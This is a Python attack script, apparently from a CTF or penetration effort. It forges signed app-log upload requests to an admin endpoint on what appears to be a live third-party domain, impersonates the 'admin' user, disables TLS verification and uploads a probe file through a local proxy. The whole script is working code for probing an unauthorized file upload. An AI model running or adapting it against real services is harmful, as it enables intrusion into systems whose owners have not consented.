import sys, ssl, urllib.request
sys.path.insert(0,'/Users/mac/Desktop')
from tsn_ctf_probe import build_signed, form_body, base_headers, multipart_body

ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
opener=urllib.request.build_opener(urllib.request.ProxyHandler({'http':'http://127.0.0.1:7897','https':'http://127.0.0.1:7897'}), urllib.request.HTTPSHandler(context=ctx))

def upload(path, filename, ctype, user='admin', school='sxqzy', note='测试反馈【联系方式：13800000000】'):
    fields={
        'note': note, 'schoolCode': school, 'userNum': user, 'appType': 'Android',
        'versionCode': '20220', 'versionName': '2.0.22',
        'signatureMD5': '7fc022e67c7d2accc3c8770a46138dc3', 'brand': 'Google', 'model': 'Pixel-7',
    }
    body,concat,sign=build_signed(fields)
    mp,ct=multipart_body(body,'files',filename,open(path,'rb').read(),ctype)
    req=urllib.request.Request('https://m.boxkj.com/admin/userAppLogFile/addLogData',data=mp,headers=base_headers(),method='POST')
    req.add_header('Content-Type',ct)
    try:
        with opener.open(req,timeout=20) as r:
            print(f'[{filename} user={user} school={school}] HTTP {r.status}: {r.read(2000).decode("utf-8","replace")}')
    except urllib.error.HTTPError as e:
        print(f'[{filename} user={user} school={school}] HTTP {e.code}: {e.read(2000).decode("utf-8","replace")}')
    except Exception as e:
        print('ERR',e)

upload('/tmp/probe.png','probe.png','image/png')
